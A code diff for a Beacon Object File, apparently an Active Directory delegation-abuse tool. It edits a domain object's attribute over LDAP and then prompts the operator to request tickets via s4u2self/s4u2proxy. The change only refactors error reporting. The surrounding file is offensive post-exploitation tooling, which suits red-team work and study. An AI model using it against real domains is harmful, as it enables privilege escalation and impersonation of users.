@@ -42,13 +42,15 @@ void go(char *args, int alen)
     if (!trustee) trustee = "";
     clear = bof_stricmp(trustee, "remove") == 0 || bof_stricmp(trustee, "clear") == 0;
 
-    ld = bof_ldap_open();
+    ld = bof_ldap_open_ex(&rc);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "LDAP connect/bind failed\n");
+        bof_error_ldap("ldap_init/bind", rc,
+                       "cannot reach or authenticate to a domain controller");
         return;
     }
-    if (bof_ldap_default_nc(ld, base, sizeof(base)) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "could not read defaultNamingContext\n");
+    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
+        bof_error_ldap("rootDSE defaultNamingContext", rc,
+                       "cannot read the domain naming context");
         WLDAP32$ldap_unbind(ld);
         return;
     }
@@ -94,8 +96,9 @@ void go(char *args, int alen)
         BeaconPrintf(CALLBACK_OUTPUT,
                      "[*] now request a service ticket with s4u2self/s4u2proxy\n");
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "ldap modify failed: %lu (%s)\n",
-                     (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
+        bof_error_ldap("ldap_modify", rc,
+                       "the directory rejected the attribute update");
+        bof_error_context("dn", dn);
     }
 
     KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
